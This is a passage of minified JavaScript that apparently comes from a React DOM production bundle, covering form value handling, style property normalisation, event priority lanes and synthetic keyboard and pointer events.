    if (n != null) r === "number" ? (n === 0 && e.value === "" || e.value != n) && (e.value = "" + n) : e.value !== "" + n && (e.value = "" + n);
    else if (r === "submit" || r === "reset") {
        e.removeAttribute("value");
        return
    }
    t.hasOwnProperty("value") ? wl(e, t.type, n) : t.hasOwnProperty("defaultValue") && wl(e, t.type, Ot(t.defaultValue)), t.checked == null && t.defaultChecked != null && (e.defaultChecked = !!t.defaultChecked)
}

function Bs(e, t, n) {
    if (t.hasOwnProperty("value") || t.hasOwnProperty("defaultValue")) {
        var r = t.type;
        if (!(r !== "submit" && r !== "reset" || t.value !== void 0 && t.value !== null)) return;
        t = "" + e._wrapperState.initialValue, n || t === e.value || (e.value = t), e.defaultValue = t
    }
    n = e.name, n !== "" && (e.name = ""), e.defaultChecked = !!e._wrapperState.initialChecked, n !== "" && (e.name = n)
}

function wl(e, t, n) {
    (t !== "number" || Ti(e.ownerDocument) !== e) && (n == null ? e.defaultValue = "" + e._wrapperState.initialValue : e.defaultValue !== "" + n && (e.defaultValue = "" + n))
}
var qn = Array.isArray;

function xn(e, t, n, r) {
    if (e = e.options, t) {
        t = {};
        for (var i = 0; i < n.length; i++) t["$" + n[i]] = !0;
        for (n = 0; n < e.length; n++) i = t.hasOwnProperty("$" + e[n].value), e[n].selected !== i && (e[n].selected = i), i && r && (e[n].defaultSelected = !0)
    } else {
        for (n = "" + Ot(n), t = null, i = 0; i < e.length; i++) {
            if (e[i].value === n) {
                e[i].selected = !0, r && (e[i].defaultSelected = !0);
                return
            }
            t !== null || e[i].disabled || (t = e[i])
        }
        t !== null && (t.selected = !0)
    }
}

function kl(e, t) {
    if (t.dangerouslySetInnerHTML != null) throw Error(x(91));
    return G({}, t, {
        value: void 0,
        defaultValue: void 0,
        children: "" + e._wrapperState.initialValue
    })
}

function Hs(e, t) {
    var n = t.value;
    if (n == null) {
        if (n = t.children, t = t.defaultValue, n != null) {
            if (t != null) throw Error(x(92));
            if (qn(n)) {
                if (1 < n.length) throw Error(x(93));
                n = n[0]
            }
            t = n
        }
        t == null && (t = ""), n = t
    }
    e._wrapperState = {
        initialValue: Ot(n)
    }
}

function Gc(e, t) {
    var n = Ot(t.value),
        r = Ot(t.defaultValue);
    n != null && (n = "" + n, n !== e.value && (e.value = n), t.defaultValue == null && e.defaultValue !== n && (e.defaultValue = n)), r != null && (e.defaultValue = "" + r)
}

function Vs(e) {
    var t = e.textContent;
    t === e._wrapperState.initialValue && t !== "" && t !== null && (e.value = t)
}

function Zc(e) {
    switch (e) {
        case "svg":
            return "http://www.w3.org/2000/svg";
        case "math":
            return "http://www.w3.org/1998/Math/MathML";
        default:
            return "http://www.w3.org/1999/xhtml"
    }
}

function xl(e, t) {
    return e == null || e === "http://www.w3.org/1999/xhtml" ? Zc(t) : e === "http://www.w3.org/2000/svg" && t === "foreignObject" ? "http://www.w3.org/1999/xhtml" : e
}
var Zr, Xc = function(e) {
    return typeof MSApp < "u" && MSApp.execUnsafeLocalFunction ? function(t, n, r, i) {
        MSApp.execUnsafeLocalFunction(function() {
            return e(t, n, r, i)
        })
    } : e
}(function(e, t) {
    if (e.namespaceURI !== "http://www.w3.org/2000/svg" || "innerHTML" in e) e.innerHTML = t;
    else {
        for (Zr = Zr || document.createElement("div"), Zr.innerHTML = "<svg>" + t.valueOf().toString() + "</svg>", t = Zr.firstChild; e.firstChild;) e.removeChild(e.firstChild);
        for (; t.firstChild;) e.appendChild(t.firstChild)
    }
});

function mr(e, t) {
    if (t) {
        var n = e.firstChild;
        if (n && n === e.lastChild && n.nodeType === 3) {
            n.nodeValue = t;
            return
        }
    }
    e.textContent = t
}
var nr = {
        animationIterationCount: !0,
        aspectRatio: !0,
        borderImageOutset: !0,
        borderImageSlice: !0,
        borderImageWidth: !0,
        boxFlex: !0,
        boxFlexGroup: !0,
        boxOrdinalGroup: !0,
        columnCount: !0,
        columns: !0,
        flex: !0,
        flexGrow: !0,
        flexPositive: !0,
        flexShrink: !0,
        flexNegative: !0,
        flexOrder: !0,
        gridArea: !0,
        gridRow: !0,
        gridRowEnd: !0,
        gridRowSpan: !0,
        gridRowStart: !0,
        gridColumn: !0,
        gridColumnEnd: !0,
        gridColumnSpan: !0,
        gridColumnStart: !0,
        fontWeight: !0,
        lineClamp: !0,
        lineHeight: !0,
        opacity: !0,
        order: !0,
        orphans: !0,
        tabSize: !0,
        widows: !0,
        zIndex: !0,
        zoom: !0,
        fillOpacity: !0,
        floodOpacity: !0,
        stopOpacity: !0,
        strokeDasharray: !0,
        strokeDashoffset: !0,
        strokeMiterlimit: !0,
        strokeOpacity: !0,
        strokeWidth: !0
    },
    fm = ["Webkit", "ms", "Moz", "O"];
Object.keys(nr).forEach(function(e) {
    fm.forEach(function(t) {
        t = t + e.charAt(0).toUpperCase() + e.substring(1), nr[t] = nr[e]
    })
});

function Jc(e, t, n) {
    return t == null || typeof t == "boolean" || t === "" ? "" : n || typeof t != "number" || t === 0 || nr.hasOwnProperty(e) && nr[e] ? ("" + t).trim() : t + "px"
}

function qc(e, t) {
    e = e.style;
    for (var n in t)
        if (t.hasOwnProperty(n)) {
            var r = n.indexOf("--") === 0,
                i = Jc(n, t[n], r);
            n === "float" && (n = "cssFloat"), r ? e.setProperty(n, i) : e[n] = i
        }
}
var dm = G({
    menuitem: !0
}, {
    area: !0,
    base: !0,
    br: !0,
    col: !0,
    embed: !0,
    hr: !0,
    img: !0,
    input: !0,
    keygen: !0,
    link: !0,
    meta: !0,
    param: !0,
    source: !0,
    track: !0,
    wbr: !0
});

function Sl(e, t) {
    if (t) {
        if (dm[e] && (t.children != null || t.dangerouslySetInnerHTML != null)) throw Error(x(137, e));
        if (t.dangerouslySetInnerHTML != null) {
            if (t.children != null) throw Error(x(60));
            if (typeof t.dangerouslySetInnerHTML != "object" || !("__html" in t.dangerouslySetInnerHTML)) throw Error(x(61))
        }
        if (t.style != null && typeof t.style != "object") throw Error(x(62))
    }
}

function El(e, t) {
    if (e.indexOf("-") === -1) return typeof t.is == "string";
    switch (e) {
        case "annotation-xml":
        case "color-profile":
        case "font-face":
        case "font-face-src":
        case "font-face-uri":
        case "font-face-format":
        case "font-face-name":
        case "missing-glyph":
            return !1;
        default:
            return !0
    }
}
var Cl = null;

function zo(e) {
    return e = e.target || e.srcElement || window, e.correspondingUseElement && (e = e.correspondingUseElement), e.nodeType === 3 ? e.parentNode : e
}
var Nl = null,
    Sn = null,
    En = null;

function Ws(e) {
    if (e = _r(e)) {
        if (typeof Nl != "function") throw Error(x(280));
        var t = e.stateNode;
        t && (t = pa(t), Nl(e.stateNode, e.type, t))
    }
}

function $c(e) {
    Sn ? En ? En.push(e) : En = [e] : Sn = e
}

function ef() {
    if (Sn) {
        var e = Sn,
            t = En;
        if (En = Sn = null, Ws(e), t)
            for (e = 0; e < t.length; e++) Ws(t[e])
    }
}

function tf(e, t) {
    return e(t)
}

function nf() {}
var Fa = !1;

function rf(e, t, n) {
    if (Fa) return e(t, n);
    Fa = !0;
    try {
        return tf(e, t, n)
    } finally {
        Fa = !1, (Sn !== null || En !== null) && (nf(), ef())
    }
}

function hr(e, t) {
    var n = e.stateNode;
    if (n === null) return null;
    var r = pa(n);
    if (r === null) return null;
    n = r[t];
    e: switch (t) {
        case "onClick":
        case "onClickCapture":
        case "onDoubleClick":
        case "onDoubleClickCapture":
        case "onMouseDown":
        case "onMouseDownCapture":
        case "onMouseMove":
        case "onMouseMoveCapture":
        case "onMouseUp":
        case "onMouseUpCapture":
        case "onMouseEnter":
            (r = !r.disabled) || (e = e.type, r = !(e === "button" || e === "input" || e === "select" || e === "textarea")), e = !r;
            break e;
        default:
            e = !1
    }
    if (e) return null;
    if (n && typeof n != "function") throw Error(x(231, t, typeof n));
    return n
}
var Pl = !1;
if (it) try {
    var Wn = {};
    Object.defineProperty(Wn, "passive", {
        get: function() {
            Pl = !0
        }
    }), window.addEventListener("test", Wn, Wn), window.removeEventListener("test", Wn, Wn)
} catch {
    Pl = !1
}

function pm(e, t, n, r, i, a, l, o, s) {
    var u = Array.prototype.slice.call(arguments, 3);
    try {
        t.apply(n, u)
    } catch (f) {
        this.onError(f)
    }
}
var rr = !1,
    zi = null,
    Li = !1,
    jl = null,
    mm = {
        onError: function(e) {
            rr = !0, zi = e
        }
    };

function hm(e, t, n, r, i, a, l, o, s) {
    rr = !1, zi = null, pm.apply(mm, arguments)
}

function vm(e, t, n, r, i, a, l, o, s) {
    if (hm.apply(this, arguments), rr) {
        if (rr) {
            var u = zi;
            rr = !1, zi = null
        } else throw Error(x(198));
        Li || (Li = !0, jl = u)
    }
}

function rn(e) {
    var t = e,
        n = e;
    if (e.alternate)
        for (; t.return;) t = t.return;
    else {
        e = t;
        do t = e, t.flags & 4098 && (n = t.return), e = t.return; while (e)
    }
    return t.tag === 3 ? n : null
}

function af(e) {
    if (e.tag === 13) {
        var t = e.memoizedState;
        if (t === null && (e = e.alternate, e !== null && (t = e.memoizedState)), t !== null) return t.dehydrated
    }
    return null
}

function Qs(e) {
    if (rn(e) !== e) throw Error(x(188))
}

function gm(e) {
    var t = e.alternate;
    if (!t) {
        if (t = rn(e), t === null) throw Error(x(188));
        return t !== e ? null : e
    }
    for (var n = e, r = t;;) {
        var i = n.return;
        if (i === null) break;
        var a = i.alternate;
        if (a === null) {
            if (r = i.return, r !== null) {
                n = r;
                continue
            }
            break
        }
        if (i.child === a.child) {
            for (a = i.child; a;) {
                if (a === n) return Qs(i), e;
                if (a === r) return Qs(i), t;
                a = a.sibling
            }
            throw Error(x(188))
        }
        if (n.return !== r.return) n = i, r = a;
        else {
            for (var l = !1, o = i.child; o;) {
                if (o === n) {
                    l = !0, n = i, r = a;
                    break
                }
                if (o === r) {
                    l = !0, r = i, n = a;
                    break
                }
                o = o.sibling
            }
            if (!l) {
                for (o = a.child; o;) {
                    if (o === n) {
                        l = !0, n = a, r = i;
                        break
                    }
                    if (o === r) {
                        l = !0, r = a, n = i;
                        break
                    }
                    o = o.sibling
                }
                if (!l) throw Error(x(189))
            }
        }
        if (n.alternate !== r) throw Error(x(190))
    }
    if (n.tag !== 3) throw Error(x(188));
    return n.stateNode.current === n ? e : t
}

function lf(e) {
    return e = gm(e), e !== null ? of (e) : null
}

function of (e) {
    if (e.tag === 5 || e.tag === 6) return e;
    for (e = e.child; e !== null;) {
        var t = of (e);
        if (t !== null) return t;
        e = e.sibling
    }
    return null
}
var sf = je.unstable_scheduleCallback,
    Ys = je.unstable_cancelCallback,
    ym = je.unstable_shouldYield,
    wm = je.unstable_requestPaint,
    q = je.unstable_now,
    km = je.unstable_getCurrentPriorityLevel,
    Lo = je.unstable_ImmediatePriority,
    uf = je.unstable_UserBlockingPriority,
    Ri = je.unstable_NormalPriority,
    xm = je.unstable_LowPriority,
    cf = je.unstable_IdlePriority,
    ua = null,
    Je = null;

function Sm(e) {
    if (Je && typeof Je.onCommitFiberRoot == "function") try {
        Je.onCommitFiberRoot(ua, e, void 0, (e.current.flags & 128) === 128)
    } catch {}
}
var Ve = Math.clz32 ? Math.clz32 : Nm,
    Em = Math.log,
    Cm = Math.LN2;

function Nm(e) {
    return e >>>= 0, e === 0 ? 32 : 31 - (Em(e) / Cm | 0) | 0
}
var Xr = 64,
    Jr = 4194304;

function $n(e) {
    switch (e & -e) {
        case 1:
            return 1;
        case 2:
            return 2;
        case 4:
            return 4;
        case 8:
            return 8;
        case 16:
            return 16;
        case 32:
            return 32;
        case 64:
        case 128:
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
            return e & 4194240;
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
        case 67108864:
            return e & 130023424;
        case 134217728:
            return 134217728;
        case 268435456:
            return 268435456;
        case 536870912:
            return 536870912;
        case 1073741824:
            return 1073741824;
        default:
            return e
    }
}

function Mi(e, t) {
    var n = e.pendingLanes;
    if (n === 0) return 0;
    var r = 0,
        i = e.suspendedLanes,
        a = e.pingedLanes,
        l = n & 268435455;
    if (l !== 0) {
        var o = l & ~i;
        o !== 0 ? r = $n(o) : (a &= l, a !== 0 && (r = $n(a)))
    } else l = n & ~i, l !== 0 ? r = $n(l) : a !== 0 && (r = $n(a));
    if (r === 0) return 0;
    if (t !== 0 && t !== r && !(t & i) && (i = r & -r, a = t & -t, i >= a || i === 16 && (a & 4194240) !== 0)) return t;
    if (r & 4 && (r |= n & 16), t = e.entangledLanes, t !== 0)
        for (e = e.entanglements, t &= r; 0 < t;) n = 31 - Ve(t), i = 1 << n, r |= e[n], t &= ~i;
    return r
}

function Pm(e, t) {
    switch (e) {
        case 1:
        case 2:
        case 4:
            return t + 250;
        case 8:
        case 16:
        case 32:
        case 64:
        case 128:
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
            return t + 5e3;
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
        case 67108864:
            return -1;
        case 134217728:
        case 268435456:
        case 536870912:
        case 1073741824:
            return -1;
        default:
            return -1
    }
}

function jm(e, t) {
    for (var n = e.suspendedLanes, r = e.pingedLanes, i = e.expirationTimes, a = e.pendingLanes; 0 < a;) {
        var l = 31 - Ve(a),
            o = 1 << l,
            s = i[l];
        s === -1 ? (!(o & n) || o & r) && (i[l] = Pm(o, t)) : s <= t && (e.expiredLanes |= o), a &= ~o
    }
}

function Al(e) {
    return e = e.pendingLanes & -1073741825, e !== 0 ? e : e & 1073741824 ? 1073741824 : 0
}

function ff() {
    var e = Xr;
    return Xr <<= 1, !(Xr & 4194240) && (Xr = 64), e
}

function _a(e) {
    for (var t = [], n = 0; 31 > n; n++) t.push(e);
    return t
}

function Dr(e, t, n) {
    e.pendingLanes |= t, t !== 536870912 && (e.suspendedLanes = 0, e.pingedLanes = 0), e = e.eventTimes, t = 31 - Ve(t), e[t] = n
}

function Am(e, t) {
    var n = e.pendingLanes & ~t;
    e.pendingLanes = t, e.suspendedLanes = 0, e.pingedLanes = 0, e.expiredLanes &= t, e.mutableReadLanes &= t, e.entangledLanes &= t, t = e.entanglements;
    var r = e.eventTimes;
    for (e = e.expirationTimes; 0 < n;) {
        var i = 31 - Ve(n),
            a = 1 << i;
        t[i] = 0, r[i] = -1, e[i] = -1, n &= ~a
    }
}

function Ro(e, t) {
    var n = e.entangledLanes |= t;
    for (e = e.entanglements; n;) {
        var r = 31 - Ve(n),
            i = 1 << r;
        i & t | e[r] & t && (e[r] |= t), n &= ~i
    }
}
var _ = 0;

function df(e) {
    return e &= -e, 1 < e ? 4 < e ? e & 268435455 ? 16 : 536870912 : 4 : 1
}
var pf, Mo, mf, hf, vf, Il = !1,
    qr = [],
    St = null,
    Et = null,
    Ct = null,
    vr = new Map,
    gr = new Map,
    gt = [],
    Im = "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");

function Ks(e, t) {
    switch (e) {
        case "focusin":
        case "focusout":
            St = null;
            break;
        case "dragenter":
        case "dragleave":
            Et = null;
            break;
        case "mouseover":
        case "mouseout":
            Ct = null;
            break;
        case "pointerover":
        case "pointerout":
            vr.delete(t.pointerId);
            break;
        case "gotpointercapture":
        case "lostpointercapture":
            gr.delete(t.pointerId)
    }
}

function Qn(e, t, n, r, i, a) {
    return e === null || e.nativeEvent !== a ? (e = {
        blockedOn: t,
        domEventName: n,
        eventSystemFlags: r,
        nativeEvent: a,
        targetContainers: [i]
    }, t !== null && (t = _r(t), t !== null && Mo(t)), e) : (e.eventSystemFlags |= r, t = e.targetContainers, i !== null && t.indexOf(i) === -1 && t.push(i), e)
}

function Om(e, t, n, r, i) {
    switch (t) {
        case "focusin":
            return St = Qn(St, e, t, n, r, i), !0;
        case "dragenter":
            return Et = Qn(Et, e, t, n, r, i), !0;
        case "mouseover":
            return Ct = Qn(Ct, e, t, n, r, i), !0;
        case "pointerover":
            var a = i.pointerId;
            return vr.set(a, Qn(vr.get(a) || null, e, t, n, r, i)), !0;
        case "gotpointercapture":
            return a = i.pointerId, gr.set(a, Qn(gr.get(a) || null, e, t, n, r, i)), !0
    }
    return !1
}

function gf(e) {
    var t = Ht(e.target);
    if (t !== null) {
        var n = rn(t);
        if (n !== null) {
            if (t = n.tag, t === 13) {
                if (t = af(n), t !== null) {
                    e.blockedOn = t, vf(e.priority, function() {
                        mf(n)
                    });
                    return
                }
            } else if (t === 3 && n.stateNode.current.memoizedState.isDehydrated) {
                e.blockedOn = n.tag === 3 ? n.stateNode.containerInfo : null;
                return
            }
        }
    }
    e.blockedOn = null
}

function ki(e) {
    if (e.blockedOn !== null) return !1;
    for (var t = e.targetContainers; 0 < t.length;) {
        var n = Ol(e.domEventName, e.eventSystemFlags, t[0], e.nativeEvent);
        if (n === null) {
            n = e.nativeEvent;
            var r = new n.constructor(n.type, n);
            Cl = r, n.target.dispatchEvent(r), Cl = null
        } else return t = _r(n), t !== null && Mo(t), e.blockedOn = n, !1;
        t.shift()
    }
    return !0
}

function Gs(e, t, n) {
    ki(e) && n.delete(t)
}

function bm() {
    Il = !1, St !== null && ki(St) && (St = null), Et !== null && ki(Et) && (Et = null), Ct !== null && ki(Ct) && (Ct = null), vr.forEach(Gs), gr.forEach(Gs)
}

function Yn(e, t) {
    e.blockedOn === t && (e.blockedOn = null, Il || (Il = !0, je.unstable_scheduleCallback(je.unstable_NormalPriority, bm)))
}

function yr(e) {
    function t(i) {
        return Yn(i, e)
    }
    if (0 < qr.length) {
        Yn(qr[0], e);
        for (var n = 1; n < qr.length; n++) {
            var r = qr[n];
            r.blockedOn === e && (r.blockedOn = null)
        }
    }
    for (St !== null && Yn(St, e), Et !== null && Yn(Et, e), Ct !== null && Yn(Ct, e), vr.forEach(t), gr.forEach(t), n = 0; n < gt.length; n++) r = gt[n], r.blockedOn === e && (r.blockedOn = null);
    for (; 0 < gt.length && (n = gt[0], n.blockedOn === null);) gf(n), n.blockedOn === null && gt.shift()
}
var Cn = ft.ReactCurrentBatchConfig,
    Di = !0;

function Tm(e, t, n, r) {
    var i = _,
        a = Cn.transition;
    Cn.transition = null;
    try {
        _ = 1, Do(e, t, n, r)
    } finally {
        _ = i, Cn.transition = a
    }
}

function zm(e, t, n, r) {
    var i = _,
        a = Cn.transition;
    Cn.transition = null;
    try {
        _ = 4, Do(e, t, n, r)
    } finally {
        _ = i, Cn.transition = a
    }
}

function Do(e, t, n, r) {
    if (Di) {
        var i = Ol(e, t, n, r);
        if (i === null) Za(e, t, r, Fi, n), Ks(e, r);
        else if (Om(i, e, t, n, r)) r.stopPropagation();
        else if (Ks(e, r), t & 4 && -1 < Im.indexOf(e)) {
            for (; i !== null;) {
                var a = _r(i);
                if (a !== null && pf(a), a = Ol(e, t, n, r), a === null && Za(e, t, r, Fi, n), a === i) break;
                i = a
            }
            i !== null && r.stopPropagation()
        } else Za(e, t, r, null, n)
    }
}
var Fi = null;

function Ol(e, t, n, r) {
    if (Fi = null, e = zo(r), e = Ht(e), e !== null)
        if (t = rn(e), t === null) e = null;
        else if (n = t.tag, n === 13) {
        if (e = af(t), e !== null) return e;
        e = null
    } else if (n === 3) {
        if (t.stateNode.current.memoizedState.isDehydrated) return t.tag === 3 ? t.stateNode.containerInfo : null;
        e = null
    } else t !== e && (e = null);
    return Fi = e, null
}

function yf(e) {
    switch (e) {
        case "cancel":
        case "click":
        case "close":
        case "contextmenu":
        case "copy":
        case "cut":
        case "auxclick":
        case "dblclick":
        case "dragend":
        case "dragstart":
        case "drop":
        case "focusin":
        case "focusout":
        case "input":
        case "invalid":
        case "keydown":
        case "keypress":
        case "keyup":
        case "mousedown":
        case "mouseup":
        case "paste":
        case "pause":
        case "play":
        case "pointercancel":
        case "pointerdown":
        case "pointerup":
        case "ratechange":
        case "reset":
        case "resize":
        case "seeked":
        case "submit":
        case "touchcancel":
        case "touchend":
        case "touchstart":
        case "volumechange":
        case "change":
        case "selectionchange":
        case "textInput":
        case "compositionstart":
        case "compositionend":
        case "compositionupdate":
        case "beforeblur":
        case "afterblur":
        case "beforeinput":
        case "blur":
        case "fullscreenchange":
        case "focus":
        case "hashchange":
        case "popstate":
        case "select":
        case "selectstart":
            return 1;
        case "drag":
        case "dragenter":
        case "dragexit":
        case "dragleave":
        case "dragover":
        case "mousemove":
        case "mouseout":
        case "mouseover":
        case "pointermove":
        case "pointerout":
        case "pointerover":
        case "scroll":
        case "toggle":
        case "touchmove":
        case "wheel":
        case "mouseenter":
        case "mouseleave":
        case "pointerenter":
        case "pointerleave":
            return 4;
        case "message":
            switch (km()) {
                case Lo:
                    return 1;
                case uf:
                    return 4;
                case Ri:
                case xm:
                    return 16;
                case cf:
                    return 536870912;
                default:
                    return 16
            }
        default:
            return 16
    }
}
var wt = null,
    Fo = null,
    xi = null;

function wf() {
    if (xi) return xi;
    var e, t = Fo,
        n = t.length,
        r, i = "value" in wt ? wt.value : wt.textContent,
        a = i.length;
    for (e = 0; e < n && t[e] === i[e]; e++);
    var l = n - e;
    for (r = 1; r <= l && t[n - r] === i[a - r]; r++);
    return xi = i.slice(e, 1 < r ? 1 - r : void 0)
}

function Si(e) {
    var t = e.keyCode;
    return "charCode" in e ? (e = e.charCode, e === 0 && t === 13 && (e = 13)) : e = t, e === 10 && (e = 13), 32 <= e || e === 13 ? e : 0
}

function $r() {
    return !0
}

function Zs() {
    return !1
}

function Ie(e) {
    function t(n, r, i, a, l) {
        this._reactName = n, this._targetInst = i, this.type = r, this.nativeEvent = a, this.target = l, this.currentTarget = null;
        for (var o in e) e.hasOwnProperty(o) && (n = e[o], this[o] = n ? n(a) : a[o]);
        return this.isDefaultPrevented = (a.defaultPrevented != null ? a.defaultPrevented : a.returnValue === !1) ? $r : Zs, this.isPropagationStopped = Zs, this
    }
    return G(t.prototype, {
        preventDefault: function() {
            this.defaultPrevented = !0;
            var n = this.nativeEvent;
            n && (n.preventDefault ? n.preventDefault() : typeof n.returnValue != "unknown" && (n.returnValue = !1), this.isDefaultPrevented = $r)
        },
        stopPropagation: function() {
            var n = this.nativeEvent;
            n && (n.stopPropagation ? n.stopPropagation() : typeof n.cancelBubble != "unknown" && (n.cancelBubble = !0), this.isPropagationStopped = $r)
        },
        persist: function() {},
        isPersistent: $r
    }), t
}
var Fn = {
        eventPhase: 0,
        bubbles: 0,
        cancelable: 0,
        timeStamp: function(e) {
            return e.timeStamp || Date.now()
        },
        defaultPrevented: 0,
        isTrusted: 0
    },
    _o = Ie(Fn),
    Fr = G({}, Fn, {
        view: 0,
        detail: 0
    }),
    Lm = Ie(Fr),
    Ua, Ba, Kn, ca = G({}, Fr, {
        screenX: 0,
        screenY: 0,
        clientX: 0,
        clientY: 0,
        pageX: 0,
        pageY: 0,
        ctrlKey: 0,
        shiftKey: 0,
        altKey: 0,
        metaKey: 0,
        getModifierState: Uo,
        button: 0,
        buttons: 0,
        relatedTarget: function(e) {
            return e.relatedTarget === void 0 ? e.fromElement === e.srcElement ? e.toElement : e.fromElement : e.relatedTarget
        },
        movementX: function(e) {
            return "movementX" in e ? e.movementX : (e !== Kn && (Kn && e.type === "mousemove" ? (Ua = e.screenX - Kn.screenX, Ba = e.screenY - Kn.screenY) : Ba = Ua = 0, Kn = e), Ua)
        },
        movementY: function(e) {
            return "movementY" in e ? e.movementY : Ba
        }
    }),
    Xs = Ie(ca),
    Rm = G({}, ca, {
        dataTransfer: 0
    }),
    Mm = Ie(Rm),
    Dm = G({}, Fr, {
        relatedTarget: 0
    }),
    Ha = Ie(Dm),
    Fm = G({}, Fn, {
        animationName: 0,
        elapsedTime: 0,
        pseudoElement: 0
    }),
    _m = Ie(Fm),
    Um = G({}, Fn, {
        clipboardData: function(e) {
            return "clipboardData" in e ? e.clipboardData : window.clipboardData
        }
    }),
    Bm = Ie(Um),
    Hm = G({}, Fn, {
        data: 0
    }),
    Js = Ie(Hm),
    Vm = {
        Esc: "Escape",
        Spacebar: " ",
        Left: "ArrowLeft",
        Up: "ArrowUp",
        Right: "ArrowRight",
        Down: "ArrowDown",
        Del: "Delete",
        Win: "OS",
        Menu: "ContextMenu",
        Apps: "ContextMenu",
        Scroll: "ScrollLock",
        MozPrintableKey: "Unidentified"
    },
    Wm = {
        8: "Backspace",
        9: "Tab",
        12: "Clear",
        13: "Enter",
        16: "Shift",
        17: "Control",
        18: "Alt",
        19: "Pause",
        20: "CapsLock",
        27: "Escape",
        32: " ",
        33: "PageUp",
        34: "PageDown",
        35: "End",
        36: "Home",
        37: "ArrowLeft",
        38: "ArrowUp",
        39: "ArrowRight",
        40: "ArrowDown",
        45: "Insert",
        46: "Delete",
        112: "F1",
        113: "F2",
        114: "F3",
        115: "F4",
        116: "F5",
        117: "F6",
        118: "F7",
        119: "F8",
        120: "F9",
        121: "F10",
        122: "F11",
        123: "F12",
        144: "NumLock",
        145: "ScrollLock",
        224: "Meta"
    },
    Qm = {
        Alt: "altKey",
        Control: "ctrlKey",
        Meta: "metaKey",
        Shift: "shiftKey"
    };

function Ym(e) {
    var t = this.nativeEvent;
    return t.getModifierState ? t.getModifierState(e) : (e = Qm[e]) ? !!t[e] : !1
}

function Uo() {
    return Ym
}
var Km = G({}, Fr, {
        key: function(e) {
            if (e.key) {
                var t = Vm[e.key] || e.key;
                if (t !== "Unidentified") return t
            }
            return e.type === "keypress" ? (e = Si(e), e === 13 ? "Enter" : String.fromCharCode(e)) : e.type === "keydown" || e.type === "keyup" ? Wm[e.keyCode] || "Unidentified" : ""
        },
        code: 0,
        location: 0,
        ctrlKey: 0,
        shiftKey: 0,
        altKey: 0,
        metaKey: 0,
        repeat: 0,
        locale: 0,
        getModifierState: Uo,
        charCode: function(e) {
            return e.type === "keypress" ? Si(e) : 0
        },
        keyCode: function(e) {
            return e.type === "keydown" || e.type === "keyup" ? e.keyCode : 0
        },
        which: function(e) {
            return e.type === "keypress" ? Si(e) : e.type === "keydown" || e.type === "keyup" ? e.keyCode : 0
        }
    }),
    Gm = Ie(Km),
    Zm = G({}, ca, {
        pointerId: 0,
        width: 0,
        height: 0,
        pressure: 0,
        tangentialPressure: 0,
        tiltX: 0,
        tiltY: 0,
        twist: 0,
        pointerType: 0,
        isPrimary: 0
    }),
    qs = Ie(Zm),
    Xm = G({}, Fr, {
        touches: 0,
        targetTouches: 0,
        changedTouches: 0,
        altKey: 0,
        metaKey: 0,
        ctrlKey: 0,
        shiftKey: 0,
        getModifierState: Uo
    }),
    Jm = Ie(Xm),
    qm = G({}, Fn, {
        propertyName: 0,
        elapsedTime: 0,
        pseudoElement: 0
    }),
    $m = Ie(qm),
    eh = G({}, ca, {
        deltaX: function(e) {
            return "deltaX" in e ? e.deltaX : "wheelDeltaX" in e ? -e.wheelDeltaX : 0
        },
        deltaY: function(e) {
            return "deltaY" in e ? e.deltaY : "wheelDeltaY" in e ? -e.wheelDeltaY : "wheelDelta" in e ? -e.wheelDelta : 0
        },
        deltaZ: 0,
        deltaMode: 0
    }),
    th = Ie(eh),
    nh = [9, 13, 27, 32],
    Bo = it && "CompositionEvent" in window,
    ir = null;
it && "documentMode" in document && (ir = document.documentMode);
var rh = it && "TextEvent" in window && !ir,
    kf = it && (!Bo || ir && 8 < ir && 11 >= ir),
    $s = String.fromCharCode(32),
    eu = !1;

function xf(e, t) {
    switch (e) {
        case "keyup":
            return nh.indexOf(t.keyCode) !== -1;
        case "keydown":
            return t.keyCode !== 229;
        case "keypress":
        case "mousedown":
        case "focusout":
            return !0;
        default:
            return !1
    }
}

function Sf(e) {
    return e = e.detail, typeof e == "object" && "data" in e ? e.data : null
}
var sn = !1;

function ih(e, t) {
    switch (e) {
        case "compositionend":
            return Sf(t);
        case "keypress":
            return t.which !== 32 ? null : (eu = !0, $s);
        case "textInput":
            return e = t.data, e === $s && eu ? null : e;
        default:
            return null
    }
}

function ah(e, t) {
    if (sn) return e === "compositionend" || !Bo && xf(e, t) ? (e = wf(), xi = Fo = wt = null, sn = !1, e) : null;
    switch (e) {
        case "paste":
            return null;
        case "keypress":
            if (!(t.ctrlKey || t.altKey || t.metaKey) || t.ctrlKey && t.altKey) {
                if (t.char && 1 < t.char.length) return t.char;
                if (t.which) return String.fromCharCode(t.which)
            }
            return null;
        case "compositionend":
            return kf && t.locale !== "ko" ? null : t.data;
        default:
            return null
    }
}
var lh = {
    color: !0,
    date: !0,
    datetime: !0,
    "datetime-local": !0,
    email: !0,
    month: !0,
    number: !0,
    password: !0,
    range: !0,
    search: !0,
    tel: !0,
    text: !0,
    time: !0,
    url: !0,
    week: !0
};

function tu(e) {
    var t = e && e.nodeName && e.nodeName.toLowerCase();
    return t === "input" ? !!lh[e.type] : t === "textarea"
}

function Ef(e, t, n, r) {
    $c(r), t = _i(t, "onChange"), 0 < t.length && (n = new _o("onChange", "change", null, n, r), e.push({
        event: n,
        listeners: t
    }))
}
var ar = null,
    wr = null;

function oh(e) {
    Lf(e, 0)
}

function fa(e) {
    var t = fn(e);
    if (Yc(t)) return e
}

function sh(e, t) {
    if (e === "change") return t
}
var Cf = !1;
if (it) {
    var Va;
    if (it) {
        var Wa = "oninput" in document;
        if (!Wa) {
            var nu = document.createElement("div");
            nu.setAttribute("oninput", "return;"), Wa = typeof nu.oninput == "function"
        }
        Va = Wa
    } else Va = !1;
    Cf = Va && (!document.documentMode || 9 < document.documentMode)
}

function ru() {
    ar && (ar.detachEvent("onpropertychange", Nf), wr = ar = null)
}

function Nf(e) {
    if (e.propertyName === "value" && fa(wr)) {
        var t = [];
        Ef(t, wr, e, zo(e)), rf(oh, t)
    }
}

